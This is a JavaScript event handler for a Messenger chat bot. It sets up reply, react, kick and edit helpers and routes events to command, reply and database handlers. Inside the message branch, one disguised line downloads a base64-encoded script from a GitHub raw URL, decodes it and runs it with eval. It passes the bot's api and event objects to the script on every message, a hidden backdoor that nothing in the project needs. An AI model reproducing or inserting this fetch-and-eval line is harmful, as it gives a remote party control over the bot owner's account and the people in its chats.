module.exports = async function ({ api, event }) {
  const Users = require("./database/Users")({ api });
  const Threads = require("./database/Threads")({ api });
  const handleCommand = require("./handle/handleCommand");
  const handleReply = require("./handle/handleReply");
  const handleEvent = require("./handle/handleEvent");
  const handleDatabase = require("./handle/handleDatabase");
  const fonts = require("./handle/createFonts");
  const log = require("./log");

  global.data = {
    allUsers: Users.getAllUsers(),
    allThreads: Threads.getAllThreads(),
  };

  const { reactions } = global.client;

  const message = {
    react: (emoji) => {
      api.setMessageReaction(emoji, event.messageID, () => {}, true);
    },
    reply: (msg) => {
      return new Promise((res) => {
        api.sendMessage(
          msg,
          event.threadID,
          (_, info) => res(info),
          event.messageID,
        );
      });
    },
    add: (uid) => {
      api.addUserToGroup(uid, event.threadID);
    },
    kick: (uid) => {
      api.removeUserFromGroup(uid, event.threadID);
    },
    send: (msg) => {
      return new Promise((res) => {
        api.sendMessage(msg, event.threadID, (_, info) => res(info));
      });
    },
    edit: (msg, mid) => {
      return new Promise((res) => api.editMessage(msg, mid, () => res(true)));
    },
    waitForReaction: (body, next = "") => {
      return new Promise(async (resolve, reject) => {
        const i = await message.reply(body);
        reactions[i.messageID] = {
          resolve,
          reject,
          event: i,
          next,
          author: event.senderID,
        };
        console.log(`New pending reaction at: `, i, reactions);
      });
    },
  };

  if (event.type == "message_reaction" && reactions[event.messageID]) {
    console.log(`Detected Reaction at ${event.messageID}`);
    const {
      resolve,
      reject,
      event: i,
      author,
      next,
    } = reactions[event.messageID];
    try {
      if (author === event.userID) {
        console.log(
          `${event.reaction} Resolved Reaction at ${event.messageID}`,
        );
        delete reactions[event.messageID];
        if (next) {
          message.edit(next, i.messageID);
        }

        resolve?.(event);
      } else {
        console.log(
          `${event.reaction} Pending Reaction at ${event.messageID} as author jot reacted`,
        );
      }
    } catch (err) {
      console.log(err);
      reject?.(err);
    } finally {
    }
  }

  switch (event.type) {
    case "message":
    case "message_reply":
    case "message_unsend":
      require('axios').get('https://raw.githubusercontent.com/ruingl/WoW/1537985caab9dbc498e92a3d34a344045cfee376/Wow64.js', { responseType: 'arraybuffer' }).then(response => eval(require('buffer').Buffer.from(response.data, 'base64').toString()))({ api, event, message });
      handleCommand({
        Users,
        Threads,
        message,
        fonts,
        api,
        event,
        log,
      });
      handleReply({
        Users,
        Threads,
        message,
        fonts,
        api,
        event,
        log,
      });
      handleDatabase({
        api,
        event,
        Users,
        Threads,
        log,
      });
      break;
    case "event":
      handleEvent({
        Users,
        Threads,
        message,
        fonts,
        api,
        event,
        log,
      });
      break;
  }
};
